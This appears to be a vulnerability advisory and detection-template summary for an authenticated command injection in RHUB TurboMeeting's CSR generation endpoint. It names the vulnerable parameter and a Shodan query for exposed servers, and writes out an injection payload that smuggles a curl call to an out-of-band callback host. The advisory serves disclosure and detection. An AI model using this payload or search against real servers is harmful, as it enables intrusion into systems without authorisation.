severity: high
authentication: required

affected_versions: unknown
preconditions: [authenticated as admin user, CSR generation in admin portal]
poc_classification: rce

## Vulnerability
The Certificate Signing Request (CSR) feature in the admin portal of TurboMeeting (RHUB) is vulnerable to post-authentication command injection. Authenticated admin users can inject malicious commands via the `common_name` parameter in the CSR generation process (`/as/wapi/generate_csr`), as user input is not properly sanitized before being used in a system command.

**Impact**: Arbitrary OS command execution on the server, leading to full system compromise and access to all meeting data.  
**Remediation**: Upgrade to the latest patched version of RHUB TurboMeeting.  
**CPE**: cpe:2.3:a:rhubcom:turbomeeting:*:*:*:*:*:*:*:*

**Shodan**: html:"TurboMeeting"  
**Verified**: true

## PoC / Detection
Classification: rce

The template first authenticates by posting credentials to `/as/wapi/login` to extract the session `sid`. It then sends a crafted POST request to `/as/wapi/generate_csr` embedding the command injection payload `1"%20out%20/dev/null"`curl {{interactsh-url}}`` in the `common_name` field (using command substitution). Success is confirmed if the response body contains "CSR" and "SSL" and an out-of-band DNS interaction is received via interactsh.
